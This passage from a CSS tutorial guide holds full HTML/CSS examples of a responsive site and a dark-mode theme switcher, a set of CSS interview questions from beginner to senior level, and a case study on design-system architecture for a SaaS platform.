          background: var(--bg-primary);
          flex-direction: column;
          justify-content: start;
          padding: 5rem 2rem;
          box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
          transition: right 0.3s ease;
        }

        .nav-menu.active {
          right: 0;
        }

        .nav-menu a {
          display: block;
          padding: 1rem 0;
          border-bottom: 1px solid var(--border-color);
        }

        .nav-menu a:hover {
          background: none;
          color: var(--primary-color);
        }
      }

      /* Print styles */
      @media print {
        header,
        footer,
        .btn,
        .mobile-menu-toggle {
          display: none;
        }

        body {
          font-size: 12pt;
          line-height: 1.4;
        }

        h1 {
          font-size: 24pt;
        }

        h2 {
          font-size: 18pt;
        }

        .feature-card {
          break-inside: avoid;
          box-shadow: none;
          border: 1px solid #ccc;
        }
      }

      /* Reduced motion */
      @media (prefers-reduced-motion: reduce) {
        * {
          animation-duration: 0.01ms !important;
          animation-iteration-count: 1 !important;
          transition-duration: 0.01ms !important;
        }

        html {
          scroll-behavior: auto;
        }
      }
    </style>
  </head>
  <body>
    <header>
      <nav class="container">
        <a href="#" class="logo">ResponsiveSite</a>
        <button class="mobile-menu-toggle" onclick="toggleMenu()">☰</button>
        <ul class="nav-menu" id="navMenu">
          <li><a href="#home">Home</a></li>
          <li><a href="#features">Features</a></li>
          <li><a href="#about">About</a></li>
          <li><a href="#contact">Contact</a></li>
        </ul>
      </nav>
    </header>

    <main>
      <section class="hero" id="home">
        <div class="container">
          <h1>Welcome to Responsive Design</h1>
          <p>
            Experience modern web design that adapts perfectly to any screen
            size
          </p>
          <a href="#features" class="btn">Explore Features</a>
        </div>
      </section>

      <section class="features container" id="features">
        <div class="feature-card">
          <div class="feature-icon">📱</div>
          <h3>Mobile First</h3>
          <p>
            Designed with mobile users in mind, ensuring optimal experience on
            all devices.
          </p>
        </div>
        <div class="feature-card">
          <div class="feature-icon">🎨</div>
          <h3>Modern Design</h3>
          <p>
            Clean, contemporary aesthetics with smooth animations and
            transitions.
          </p>
        </div>
        <div class="feature-card">
          <div class="feature-icon">⚡</div>
          <h3>Lightning Fast</h3>
          <p>
            Optimized for performance with minimal loading times and smooth
            interactions.
          </p>
        </div>
        <div class="feature-card">
          <div class="feature-icon">🔧</div>
          <h3>Easy to Customize</h3>
          <p>
            Built with CSS variables and modular components for easy
            customization.
          </p>
        </div>
        <div class="feature-card">
          <div class="feature-icon">♿</div>
          <h3>Accessible</h3>
          <p>
            Following WCAG guidelines to ensure accessibility for all users.
          </p>
        </div>
        <div class="feature-card">
          <div class="feature-icon">🌍</div>
          <h3>Cross-Browser</h3>
          <p>Tested and optimized for all modern browsers and devices.</p>
        </div>
      </section>
    </main>

    <script>
      function toggleMenu() {
        const navMenu = document.getElementById("navMenu");
        navMenu.classList.toggle("active");
      }

      // Close menu when clicking on a link
      document.querySelectorAll(".nav-menu a").forEach((link) => {
        link.addEventListener("click", () => {
          document.getElementById("navMenu").classList.remove("active");
        });
      });
    </script>
  </body>
</html>
```

### Dark Mode Example

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dark Mode Example</title>
    <style>
      /* CSS Variables for theming */
      :root {
        /* Light theme (default) */
        --bg-primary: #ffffff;
        --bg-secondary: #f8fafc;
        --bg-tertiary: #f1f5f9;
        --text-primary: #1e293b;
        --text-secondary: #475569;
        --text-tertiary: #64748b;
        --text-inverse: #ffffff;
        --border-primary: #e2e8f0;
        --border-secondary: #cbd5e1;
        --accent-primary: #3b82f6;
        --accent-primary-hover: #2563eb;
        --accent-secondary: #64748b;
        --success: #10b981;
        --warning: #f59e0b;
        --error: #ef4444;
        --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
        --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.07);
        --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);
      }

      /* Dark theme */
      [data-theme="dark"] {
        --bg-primary: #0f172a;
        --bg-secondary: #1e293b;
        --bg-tertiary: #334155;
        --text-primary: #f8fafc;
        --text-secondary: #e2e8f0;
        --text-tertiary: #cbd5e1;
        --text-inverse: #0f172a;
        --border-primary: #334155;
        --border-secondary: #475569;
        --accent-primary: #60a5fa;
        --accent-primary-hover: #3b82f6;
        --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
        --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.4);
        --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.5);
      }

      /* High contrast theme */
      [data-theme="high-contrast"] {
        --bg-primary: #000000;
        --bg-secondary: #1a1a1a;
        --bg-tertiary: #333333;
        --text-primary: #ffffff;
        --text-secondary: #cccccc;
        --text-tertiary: #999999;
        --text-inverse: #000000;
        --border-primary: #ffffff;
        --border-secondary: #cccccc;
        --accent-primary: #0066cc;
        --accent-primary-hover: #0052a3;
        --shadow-sm: 0 1px 2px rgba(255, 255, 255, 0.1);
        --shadow-md: 0 4px 6px rgba(255, 255, 255, 0.2);
        --shadow-lg: 0 10px 15px rgba(255, 255, 255, 0.3);
      }

      /* Base styles */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family:
          system-ui,
          -apple-system,
          sans-serif;
        background: var(--bg-primary);
        color: var(--text-primary);
        line-height: 1.6;
        transition:
          background 0.3s ease,
          color 0.3s ease;
      }

      .container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 1rem;
      }

      /* Header with theme switcher */
      header {
        background: var(--bg-secondary);
        border-bottom: 1px solid var(--border-primary);
        position: sticky;
        top: 0;
        z-index: 100;
        transition: all 0.3s ease;
      }

      nav {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1rem 0;
      }

      .logo {
        font-size: 1.5rem;
        font-weight: bold;
        color: var(--accent-primary);
        text-decoration: none;
      }

      .theme-switcher {
        display: flex;
        align-items: center;
        gap: 0.75rem;
      }

      .theme-toggle {
        position: relative;
        width: 60px;
        height: 30px;
        background: var(--border-primary);
        border-radius: 15px;
        cursor: pointer;
        transition: background 0.3s ease;
      }

      .theme-toggle::after {
        content: "";
        position: absolute;
        top: 3px;
        left: 3px;
        width: 24px;
        height: 24px;
        background: white;
        border-radius: 50%;
        transition: transform 0.3s ease;
        box-shadow: var(--shadow-sm);
      }

      [data-theme="dark"] .theme-toggle::after,
      [data-theme="high-contrast"] .theme-toggle::after {
        transform: translateX(30px);
      }

      [data-theme="dark"] .theme-toggle,
      [data-theme="high-contrast"] .theme-toggle {
        background: var(--accent-primary);
      }

      .theme-icon {
        font-size: 1.25rem;
      }

      /* Main content */
      main {
        padding: 2rem 0;
      }

      .hero {
        background: linear-gradient(135deg, var(--accent-primary), #8b5cf6);
        color: var(--text-inverse);
        padding: 4rem 0;
        text-align: center;
        border-radius: 1rem;
        margin-bottom: 3rem;
      }

      h1 {
        font-size: 3rem;
        margin-bottom: 1rem;
        font-weight: 700;
      }

      .hero p {
        font-size: 1.25rem;
        margin-bottom: 2rem;
        opacity: 0.9;
      }

      /* Cards */
      .cards {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 2rem;
        margin-bottom: 3rem;
      }

      .card {
        background: var(--bg-secondary);
        border: 1px solid var(--border-primary);
        border-radius: 0.75rem;
        padding: 2rem;
        box-shadow: var(--shadow-md);
        transition: all 0.3s ease;
      }

      .card:hover {
        transform: translateY(-4px);
        box-shadow: var(--shadow-lg);
      }

      .card h3 {
        font-size: 1.5rem;
        margin-bottom: 1rem;
        color: var(--text-primary);
      }

      .card p {
        color: var(--text-secondary);
        margin-bottom: 1.5rem;
      }

      /* Buttons */
      .btn {
        display: inline-block;
        padding: 0.75rem 1.5rem;
        background: var(--accent-primary);
        color: var(--text-inverse);
        text-decoration: none;
        border-radius: 0.5rem;
        font-weight: 600;
        transition: all 0.2s ease;
        border: none;
        cursor: pointer;
      }

      .btn:hover {
        background: var(--accent-primary-hover);
        transform: translateY(-2px);
      }

      /* Theme options */
      .theme-options {
        background: var(--bg-tertiary);
        border-radius: 0.75rem;
        padding: 2rem;
        margin-bottom: 3rem;
      }

      .theme-options h2 {
        margin-bottom: 1.5rem;
        color: var(--text-primary);
      }

      .theme-buttons {
        display: flex;
        gap: 1rem;
        flex-wrap: wrap;
      }

      .theme-btn {
        padding: 0.5rem 1rem;
        background: var(--bg-secondary);
        border: 2px solid var(--border-primary);
        border-radius: 0.5rem;
        color: var(--text-primary);
        cursor: pointer;
        transition: all 0.2s ease;
      }

      .theme-btn:hover {
        border-color: var(--accent-primary);
        transform: translateY(-1px);
      }

      .theme-btn.active {
        background: var(--accent-primary);
        color: var(--text-inverse);
        border-color: var(--accent-primary);
      }

      /* Footer */
      footer {
        background: var(--bg-secondary);
        border-top: 1px solid var(--border-primary);
        padding: 2rem 0;
        text-align: center;
        margin-top: 3rem;
      }

      footer p {
        color: var(--text-secondary);
      }

      /* System preference detection */
      @media (prefers-color-scheme: dark) {
        :root:not([data-theme]) {
          --bg-primary: #0f172a;
          --bg-secondary: #1e293b;
          --bg-tertiary: #334155;
          --text-primary: #f8fafc;
          --text-secondary: #e2e8f0;
          --text-tertiary: #cbd5e1;
          --border-primary: #334155;
          --border-secondary: #475569;
        }
      }
    </style>
  </head>
  <body>
    <header>
      <nav class="container">
        <a href="#" class="logo">ThemeSwitcher</a>
        <div class="theme-switcher">
          <span class="theme-icon">☀️</span>
          <div class="theme-toggle" onclick="toggleTheme()"></div>
          <span class="theme-icon">🌙</span>
        </div>
      </nav>
    </header>

    <main class="container">
      <section class="hero">
        <h1>Adaptive Theme System</h1>
        <p>
          Experience seamless light and dark mode transitions with CSS custom
          properties
        </p>
        <button class="btn" onclick="cycleThemes()">
          Cycle Through Themes
        </button>
      </section>

      <section class="theme-options">
        <h2>Choose Your Theme</h2>
        <div class="theme-buttons">
          <button class="theme-btn active" onclick="setTheme('light')">
            ☀️ Light
          </button>
          <button class="theme-btn" onclick="setTheme('dark')">🌙 Dark</button>
          <button class="theme-btn" onclick="setTheme('high-contrast')">
            ⚡ High Contrast
          </button>
          <button class="theme-btn" onclick="setTheme('system')">
            🖥️ System
          </button>
        </div>
      </section>

      <section class="cards">
        <div class="card">
          <h3>🎨 Beautiful Design</h3>
          <p>
            Carefully crafted color palettes that work perfectly in both light
            and dark modes. Every element is optimized for readability and
            visual comfort.
          </p>
          <button class="btn">Learn More</button>
        </div>
        <div class="card">
          <h3>♿ Accessibility First</h3>
          <p>
            Built with WCAG guidelines in mind, ensuring proper contrast ratios
            and screen reader compatibility. The high contrast mode provides
            maximum readability.
          </p>
          <button class="btn">Explore</button>
        </div>
        <div class="card">
          <h3>⚡ Instant Transitions</h3>
          <p>
            Smooth theme transitions powered by CSS custom properties. No page
            reload required - themes switch instantly with beautiful animations.
          </p>
          <button class="btn">Try It</button>
        </div>
      </section>
    </main>

    <footer>
      <div class="container">
        <p>
          &copy; 2024 ThemeSwitcher. Built with CSS custom properties and
          accessibility in mind.
        </p>
      </div>
    </footer>

    <script>
      // Theme management
      const themes = ["light", "dark", "high-contrast"];
      let currentThemeIndex = 0;

      // Initialize theme
      function initTheme() {
        const savedTheme = localStorage.getItem("theme");
        const systemTheme = window.matchMedia("(prefers-color-scheme: dark)")
          .matches
          ? "dark"
          : "light";

        if (savedTheme) {
          if (savedTheme === "system") {
            applyTheme(systemTheme);
          } else {
            applyTheme(savedTheme);
          }
        } else {
          applyTheme(systemTheme);
        }
      }

      // Apply theme
      function applyTheme(theme) {
        document.documentElement.setAttribute("data-theme", theme);
        updateThemeButtons(theme);
      }

      // Update theme buttons
      function updateThemeButtons(activeTheme) {
        document.querySelectorAll(".theme-btn").forEach((btn) => {
          btn.classList.remove("active");
          if (
            btn.textContent.toLowerCase().includes(activeTheme) ||
            (activeTheme === "high-contrast" &&
              btn.textContent.includes("High Contrast")) ||
            (activeTheme === "system" && btn.textContent.includes("System"))
          ) {
            btn.classList.add("active");
          }
        });
      }

      // Toggle between light and dark
      function toggleTheme() {
        const currentTheme =
          document.documentElement.getAttribute("data-theme");
        const newTheme =
          currentTheme === "dark" || currentTheme === "high-contrast"
            ? "light"
            : "dark";
        setTheme(newTheme);
      }

      // Set specific theme
      function setTheme(theme) {
        if (theme === "system") {
          const systemTheme = window.matchMedia("(prefers-color-scheme: dark)")
            .matches
            ? "dark"
            : "light";
          applyTheme(systemTheme);
          localStorage.setItem("theme", "system");
        } else {
          applyTheme(theme);
          localStorage.setItem("theme", theme);
        }
      }

      // Cycle through all themes
      function cycleThemes() {
        currentThemeIndex = (currentThemeIndex + 1) % themes.length;
        setTheme(themes[currentThemeIndex]);
      }

      // Listen for system theme changes
      window
        .matchMedia("(prefers-color-scheme: dark)")
        .addEventListener("change", (e) => {
          const savedTheme = localStorage.getItem("theme");
          if (savedTheme === "system" || !savedTheme) {
            applyTheme(e.matches ? "dark" : "light");
          }
        });

      // Initialize on load
      document.addEventListener("DOMContentLoaded", initTheme);
    </script>
  </body>
</html>
```

---

_Section 10 complete. This section provides comprehensive, production-ready code examples covering basic CSS, Flexbox, responsive design, and dark mode implementation. Each example includes detailed explanations and follows modern best practices for accessibility and performance._

## 11. Common Interview Questions

### Beginner Level Questions

#### Q1: What is the CSS Box Model?

**Answer:** The CSS box model is a fundamental concept that describes how every HTML element is rendered as a rectangular box. It consists of four layers:

- **Content**: The actual content (text, images)
- **Padding**: Space between content and border
- **Border**: The border around the padding
- **Margin**: Space outside the border

```css
.box {
  width: 200px; /* Content width */
  padding: 20px; /* Adds to total width */
  border: 5px solid; /* Adds to total width */
  margin: 10px; /* Outside the box */
  /* Total width = 200 + 20*2 + 5*2 + 10*2 = 290px */
}
```

#### Q2: What's the difference between `display: none` and `visibility: hidden`?

**Answer:**

- `display: none`: Removes the element completely from the document flow. Other elements will occupy its space.
- `visibility: hidden`: Hides the element but it still occupies space in the layout.

```css
.hidden-display {
  display: none; /* Element removed, space collapsed */
}

.hidden-visibility {
  visibility: hidden; /* Element invisible, space preserved */
}
```

#### Q3: What are CSS selectors and name some types?

**Answer:** CSS selectors are patterns used to select and style HTML elements. Main types include:

- **Type selectors**: `div`, `p`, `h1`
- **Class selectors**: `.classname`
- **ID selectors**: `#idname`
- **Attribute selectors**: `[type="text"]`
- **Pseudo-classes**: `:hover`, `:first-child`
- **Pseudo-elements**: `::before`, `::after`
- **Combinators**: ` ` (descendant), `>` (child), `+` (adjacent sibling)

#### Q4: What is CSS specificity?

**Answer:** Specificity is the algorithm browsers use to determine which CSS rule applies when multiple rules target the same element. Hierarchy (highest to lowest):

1. Inline styles (`style="..."`)
2. ID selectors (`#header`)
3. Class/attribute/pseudo-classes (`.class`, `[type]`, `:hover`)
4. Element selectors (`div`, `p`)
5. Universal selector (`*`)

### Mid-Level Questions

#### Q5: Explain the difference between `block`, `inline`, and `inline-block`

**Answer:**

- **Block**: Takes full width, starts on new line, width/height can be set (`div`, `p`, `h1`)
- **Inline**: Flows with text, no width/height, margins only horizontal (`span`, `a`, `img`)
- **Inline-block**: Flows with text but respects width/height and all margins

```css
.block {
  display: block;
}
.inline {
  display: inline;
}
.inline-block {
  display: inline-block;
}
```

#### Q6: What is the difference between `position: relative`, `absolute`, and `fixed`?

**Answer:**

- **Relative**: Positioned relative to its normal position, space preserved in layout
- **Absolute**: Positioned relative to nearest positioned ancestor, removed from normal flow
- **Fixed**: Positioned relative to viewport, stays in place during scroll

```css
.parent {
  position: relative; /* Creates positioning context */
}

.child {
  position: absolute; /* Positioned relative to .parent */
  top: 0;
  left: 0;
}

.sticky-header {
  position: fixed; /* Stays at top during scroll */
  top: 0;
}
```

#### Q7: Explain Flexbox and its main properties

**Answer:** Flexbox is a one-dimensional layout method for arranging items in rows or columns.

**Container properties:**

- `display: flex` - Creates flex container
- `flex-direction` - Sets main axis (row/column)
- `justify-content` - Aligns items on main axis
- `align-items` - Aligns items on cross axis
- `flex-wrap` - Allows items to wrap

**Item properties:**

- `flex-grow` - How much item can grow
- `flex-shrink` - How much item can shrink
- `flex-basis` - Default size
- `align-self` - Override container alignment

#### Q8: What are CSS Custom Properties and how do they differ from SASS variables?

**Answer:** CSS Custom Properties (CSS Variables) are native CSS variables that can be changed dynamically with JavaScript.

**Differences from SASS variables:**

- **Live**: Can be changed at runtime with JavaScript
- **Cascade**: Respect CSS cascade and inheritance
- **Dynamic**: Can be updated based on media queries or user preferences
- **Native**: No preprocessing required

```css
:root {
  --primary-color: #3b82f6;
}

.button {
  background: var(--primary-color);
}

/* JavaScript can update this */
element.style.setProperty('--primary-color', '#ff0000');
```

### Senior-Level Questions

#### Q9: Explain the CSS rendering pipeline and optimization strategies

**Answer:** The CSS rendering pipeline involves:

1. **Parse CSS** → CSSOM (CSS Object Model)
2. **Combine with DOM** → Render Tree
3. **Layout** → Calculate positions (reflow)
4. **Paint** → Draw pixels (repaint)
5. **Composite** → Combine layers

**Optimization strategies:**

- Use `transform` and `opacity` for animations (GPU accelerated)
- Avoid layout thrashing by batching reads/writes
- Use `will-change` sparingly for animated elements
- Implement critical CSS for above-the-fold content
- Use containment (`contain: layout paint`) for complex components

#### Q10: How would you implement a scalable CSS architecture for a large application?

**Answer:** I would implement a multi-layered approach:

**1. Design System Layer:**

```css
:root {
  /* Design tokens */
  --color-primary: #3b82f6;
  --spacing-sm: 0.5rem;
  --font-size-base: 1rem;
}
```

**2. Base Layer:**

```css
/* reset.css, typography.css, base.css */
* {
  box-sizing: border-box;
}
body {
  font-family: system-ui;
}
```

**3. Component Layer:**

```css
/* BEM methodology */
.card {
}
.card__header {
}
.card--featured {
}
```

**4. Utility Layer:**

```css
/* Atomic/utility classes */
.text-center {
  text-align: center;
}
.mb-4 {
  margin-bottom: 1rem;
}
```

**5. Implementation Strategy:**

- Use CSS Modules or CSS-in-JS for component isolation
- Implement design tokens for consistency
- Use naming conventions (BEM) for maintainability
- Create documentation and style guides
- Implement automated testing for visual regressions

#### Q11: Explain CSS containment and its performance benefits

**Answer:** CSS containment allows developers to isolate parts of the DOM, telling the browser that a subtree's style/layout won't affect other parts.

**Types of containment:**

- `contain: layout` - Browser can skip layout calculations outside
- `contain: paint` - Browser can optimize paint operations
- `contain: size` - Browser can skip size calculations
- `contain: style` - Browser can optimize style calculations
- `contain: strict` - All types of containment

**Benefits:**

- Reduces layout scope for complex components
- Improves rendering performance
- Enables better optimization by browsers
- Prevents unintended side effects

```css
.widget {
  contain: layout style paint;
  /* This tells browser:
     - Layout changes won't affect outside elements
     - Style changes won't affect outside elements  
     - Paint changes won't affect outside elements
  */
}
```

#### Q12: How would you implement a theme system that supports light/dark mode and custom branding?

**Answer:** I would implement a comprehensive theming system:

**1. CSS Custom Properties Structure:**

```css
:root {
  /* Base theme */
  --bg-primary: #ffffff;
  --text-primary: #1e293b;
  --accent: #3b82f6;
}

[data-theme="dark"] {
  --bg-primary: #0f172a;
  --text-primary: #f8fafc;
  --accent: #60a5fa;
}

[data-brand="accenture"] {
  --accent: #a100ff;
  --accent-hover: #8600d4;
}
```

**2. Theme Switching Implementation:**

```javascript
class ThemeManager {
  constructor() {
    this.init();
  }

  init() {
    const savedTheme = localStorage.getItem("theme") || "light";
    this.setTheme(savedTheme);
  }

  setTheme(theme) {
    document.documentElement.setAttribute("data-theme", theme);
    localStorage.setItem("theme", theme);
    this.notifyComponents(theme);
  }

  setBrand(brand) {
    document.documentElement.setAttribute("data-brand", brand);
  }
}
```

**3. Component Integration:**

```css
.button {
  background: var(--accent);
  color: var(--text-inverse);
  transition: background 0.3s ease;
}

.button:hover {
  background: var(--accent-hover);
}
```

**4. Advanced Features:**

- System preference detection
- Smooth transitions between themes
- Brand customization for white-labeling
- Accessibility considerations (high contrast mode)
- Performance optimization (CSS containment)

### System Design Questions

#### Q13: Design a CSS architecture for a micro-frontend application

**Answer:** For micro-frontends, I'd implement a hybrid approach:

**1. Global Design System:**

```css
/* Shared design tokens */
:root {
  --global-primary: #3b82f6;
  --global-spacing: 1rem;
}

/* Base styles shared across micro-frontends */
.global-base {
  box-sizing: border-box;
  font-family: system-ui;
}
```

**2. Micro-Frontend Isolation:**

```css
/* Namespace approach */
.mfe-app-1 .button {
  /* App 1 specific styles */
}
.mfe-app-2 .button {
  /* App 2 specific styles */
}

/* Shadow DOM approach */
:host {
  /* Component isolation */
}
```

**3. Integration Strategy:**

- Shared design system for consistency
- CSS Modules for component isolation
- PostCSS with plugins for cross-app compatibility
- Runtime style loading for dynamic micro-frontends
- Conflict resolution through CSS specificity management

#### Q14: How would you optimize CSS for a large e-commerce site with millions of products?

**Answer:** Optimization strategy:

**1. Critical CSS Optimization:**

```html
<!-- Inline critical above-the-fold CSS -->
<style>
  /* Critical styles for header, hero, navigation */
</style>

<!-- Load non-critical CSS asynchronously -->
<link
  rel="preload"
  href="styles.css"
  as="style"
  onload="this.onload=null;this.rel='stylesheet'"
/>
```

**2. Component-Based Architecture:**

```css
/* Product card component */
.product-card {
  contain: layout style paint; /* Performance optimization */
}

/* Lazy-loaded components */
.lazy-component {
  content-visibility: auto;
  contain-intrinsic-size: 0 500px;
}
```

**3. Performance Techniques:**

- PurgeCSS to remove unused CSS
- CSS modules for style isolation
- Efficient selectors (avoid deep nesting)
- GPU-accelerated animations
- Image optimization with `object-fit`
- Responsive images with `srcset`

**4. Bundle Optimization:**

```javascript
// Dynamic CSS loading
const loadComponentCSS = async (component) => {
  await import(`./components/${component}.css`);
};
```

---

_Section 11 complete. This comprehensive interview guide covers questions from beginner to senior level, including system design scenarios. Each answer includes practical code examples and real-world applications._

## 12. Real-World Case Study

### Production SaaS Application: CSS Architecture & Performance

#### Background

A multi-tenant SaaS platform serving 100,000+ users with:

- Complex dashboard with real-time data
- White-label customization for enterprise clients
- Responsive design across desktop, tablet, and mobile
- Internationalization support (RTL/LTR languages)
- Accessibility compliance (WCAG 2.1 AA)

#### Challenge Overview

**Initial Problems:**

1. **CSS Bundle Size**: 450KB unminified, causing slow initial loads
2. **Style Conflicts**: Global CSS pollution between micro-frontends
3. **Performance**: Layout thrashing in dashboard components
4. **Maintenance**: Inconsistent naming conventions across teams
5. **Themability**: Hard-coded colors preventing white-label customization

#### Solution Architecture

**1. Design System Implementation**

```css
/* tokens/core.css - Central design tokens */
:root {
  /* Color system */
  --color-primary-50: #eff6ff;
  --color-primary-500: #3b82f6;
  --color-primary-900: #1e3a8a;

  /* Semantic colors */
  --color-success: #10b981;
  --color-warning: #f59e0b;
  --color-error: #ef4444;

  /* Spacing scale */
  --space-0: 0;
  --space-1: 0.25rem;
  --space-2: 0.5rem;
  --space-3: 0.75rem;
  --space-4: 1rem;
  --space-5: 1.25rem;
  --space-6: 1.5rem;

  /* Typography scale */
  --text-xs: 0.75rem;
  --text-sm: 0.875rem;
  --text-base: 1rem;
  --text-lg: 1.125rem;
  --text-xl: 1.25rem;

  /* Z-index scale */
  --z-dropdown: 1000;
  --z-sticky: 1020;
  --z-modal: 1050;
  --z-tooltip: 1070;
}

/* themes/branding.css - White-label support */
[data-theme="dark"] {
  --color-background: #0f172a;
  --color-surface: #1e293b;
  --color-text: #f8fafc;
}

[data-brand="enterprise-a"] {
  --color-primary-500: #8b5cf6;
  --color-primary-600: #7c3aed;
}

[data-brand="enterprise-b"] {
  --color-primary-500: #10b981;
  --color-primary-600: #059669;
}
```

**2. Component Architecture**

```css
/* components/Button.css - CSS Modules approach */
.button {
  /* Base styles using design tokens */
  padding: var(--space-3) var(--space-6);
  border: none;
  border-radius: var(--radius-md);
  font-family: inherit;
  font-size: var(--text-base);
  font-weight: 500;
  cursor: pointer;
  transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: var(--space-2);

  /* Performance optimization */
  contain: layout style paint;
  will-change: transform;
}

.button:hover {
  transform: translateY(-1px);
  box-shadow: var(--shadow-md);
}

.button:active {
  transform: translateY(0);
}

/* Size variants */
.button--sm {
  padding: var(--space-2) var(--space-4);
  font-size: var(--text-sm);
}

.button--lg {
  padding: var(--space-4) var(--space-8);
  font-size: var(--text-lg);
}

/* Style variants */
.button--primary {
  background: var(--color-primary-500);
  color: var(--color-white);
}

.button--primary:hover {
  background: var(--color-primary-600);
}

.button--outline {
  background: transparent;
  color: var(--color-primary-500);
  border: 2px solid var(--color-primary-500);
}

.button--outline:hover {
  background: var(--color-primary-500);
  color: var(--color-white);
}

/* State variants */
.button:disabled {
  opacity: 0.6;
  cursor: not-allowed;
  pointer-events: none;
  transform: none;
}

.button--loading {
  color: transparent;
  position: relative;
}

.button--loading::after {
  content: "";
  position: absolute;
  top: 50%;
  left: 50%;
  width: 1em;
  height: 1em;
  margin: -0.5em 0 0 -0.5em;
  border: 2px solid currentColor;
  border-radius: 50%;
  border-top-color: transparent;
  animation: spin 0.6s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
```

**3. Performance Optimization Implementation**

```css
/* critical.css - Critical above-the-fold styles */
.header {
  background: var(--color-surface);
  padding: var(--space-4) 0;
  position: sticky;
  top: 0;
  z-index: var(--z-sticky);
  contain: layout style paint;
}

.navigation {
  display: flex;
  justify-content: space-between;
  align-items: center;
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 var(--space-4);
}

.hero {
  min-height: 80vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: linear-gradient(
    135deg,
    var(--color-primary-500),
    var(--color-primary-600)
  );
  color: var(--color-white);
  text-align: center;
  padding: var(--space-8) var(--space-4);
}

/* dashboard.css - Optimized dashboard components */
.dashboard-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: var(--space-6);
  padding: var(--space-6);

  /* Performance optimization */
  contain: layout style paint;
}

.metric-card {
  background: var(--color-surface);
  border: 1px solid var(--color-border);
  border-radius: var(--radius-lg);
  padding: var(--space-6);

  /* Critical for performance */
  contain: layout style paint;
  content-visibility: auto;
  contain-intrinsic-size: 0 200px;

  /* GPU acceleration for hover effects */
  transition: transform 0.2s ease;
  will-change: transform;
}

.metric-card:hover {
  transform: translateY(-2px);
  box-shadow: var(--shadow-lg);
}

.metric-value {
  font-size: var(--text-3xl);
  font-weight: 700;
  color: var(--color-text);
  margin-bottom: var(--space-2);

  /* Optimized text rendering */
  text-rendering: optimizeSpeed;
}

.metric-label {
  font-size: var(--text-sm);
  color: var(--color-text-secondary);
  text-transform: uppercase;
  letter-spacing: 0.05em;
}
```

**4. Responsive Design Strategy**

```css
/* responsive.css - Mobile-first responsive design */
.container {
  width: 100%;
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 var(--space-4);
}

/* Fluid typography */
.heading-1 {
  font-size: clamp(2rem, 5vw, 3.5rem);
  line-height: 1.2;
  font-weight: 700;
}

.heading-2 {
  font-size: clamp(1.5rem, 4vw, 2.5rem);
  line-height: 1.3;
  font-weight: 600;
}

/* Responsive grid system */
.responsive-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: var(--space-6);
}

/* Mobile-first breakpoints */
@media (min-width: 768px) {
  .container {
    padding: 0 var(--space-6);
  }

  .responsive-grid {
    grid-template-columns: repeat(2, 1fr);
  }
}

@media (min-width: 1024px) {
  .responsive-grid {
    grid-template-columns: repeat(3, 1fr);
  }
}

@media (min-width: 1280px) {
  .responsive-grid {
    grid-template-columns: repeat(4, 1fr);
  }
}

/* Tablet-specific adjustments */
@media (min-width: 768px) and (max-width: 1023px) {
  .sidebar {
    position: fixed;
    left: 0;
    top: 0;
    height: 100vh;
    width: 280px;
    transform: translateX(-100%);
    transition: transform 0.3s ease;
    z-index: var(--z-modal);
  }

  .sidebar.open {
    transform: translateX(0);
  }
}
```

**5. Internationalization Support**

```css
/* i18n.css - Internationalization support */
[dir="rtl"] {
  /* RTL text direction */
  text-align: right;
}

[dir="rtl"] .navigation {
  flex-direction: row-reverse;
}

[dir="rtl"] .sidebar {
  left: auto;
  right: 0;
  transform: translateX(100%);
}

[dir="rtl"] .sidebar.open {
  transform: translateX(0);
}

[dir="rtl"] .metric-card {
  text-align: right;
}

[dir="rtl"] .button {
  flex-direction: row-reverse;
}

/* Language-specific font optimizations */
:lang(ar) {
  font-family: "Noto Sans Arabic", system-ui, sans-serif;
}

:lang(ja) {
  font-family: "Noto Sans JP", system-ui, sans-serif;
}

:lang(zh) {
  font-family: "Noto Sans SC", system-ui, sans-serif;
}
```

#### Implementation Results

**Performance Improvements:**

- **Bundle Size**: Reduced from 450KB to 180KB (60% reduction)
- **First Contentful Paint**: Improved from 2.8s to 1.2s
- **Layout Shift**: Reduced CLS from 0.15 to 0.05
- **Bundle Loading**: Implemented code splitting, 40% faster initial load

**Development Efficiency:**

- **Consistency**: 95% adherence to design system across teams
- **Onboarding**: New developers productive 50% faster
- **Bug Reduction**: 70% fewer CSS-related bugs
- **Code Review Time**: Reduced by 40%

**Business Impact:**

- **White-label Sales**: 25 enterprise clients signed up
- **User Satisfaction**: NPS increased from 45 to 72
- **Accessibility**: WCAG 2.1 AA compliance achieved
- **Mobile Usage**: 60% increase in mobile engagement

#### Technical Decisions & Trade-offs

**1. CSS Modules vs Styled Components**

```javascript
// Decision: CSS Modules for better performance
// Trade-off: Less dynamic than styled-components but faster runtime

import styles from "./Button.module.css";

function Button({ variant, size, children }) {
  return (
    <button
      className={`${styles.button} ${styles[`button--${variant}`]} ${styles[`button--${size}`]}`}
    >
      {children}
    </button>
  );
}
```

**2. Critical CSS vs Full Bundle Loading**

```html
<!-- Decision: Critical CSS for above-the-fold content -->
<!-- Trade-off: More complex build process but better performance -->

<style>
  /* 15KB of critical CSS inlined */
  .header,
  .hero,
  .navigation {
    /* Critical styles */
  }
</style>

<link
  rel="preload"
  href="main.css"
  as="style"
  onload="this.onload=null;this.rel='stylesheet'"
/>
```

